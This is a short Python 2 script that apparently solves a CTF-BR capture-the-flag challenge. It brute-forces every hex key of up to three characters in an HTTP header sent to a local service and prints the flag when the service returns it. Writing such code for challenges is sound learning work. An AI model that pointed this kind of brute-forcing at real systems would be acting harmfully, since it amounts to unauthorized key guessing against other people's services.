#!/usr/bin/pypy
import string, itertools, multiprocessing
from urllib2 import urlopen, Request, HTTPError
url = 'http://127.0.0.1:8080'
allowedc = set(string.hexdigits.lower())
maxkeylen = 3

def try_key(key):
    key = ''.join(key)
    try:
        r = urlopen(Request(url, headers={'Return': key}))
    except HTTPError as e:
        r = e
    flag = r.info()['Return']
    if flag.startswith('CTF-BR{'):
        print('key: %s' % key)
        print('flag: %s' % flag)

p = multiprocessing.Pool(processes=16)
for keylen in xrange(1, maxkeylen+1):
    p.map(try_key, itertools.product(*(keylen*[allowedc])))
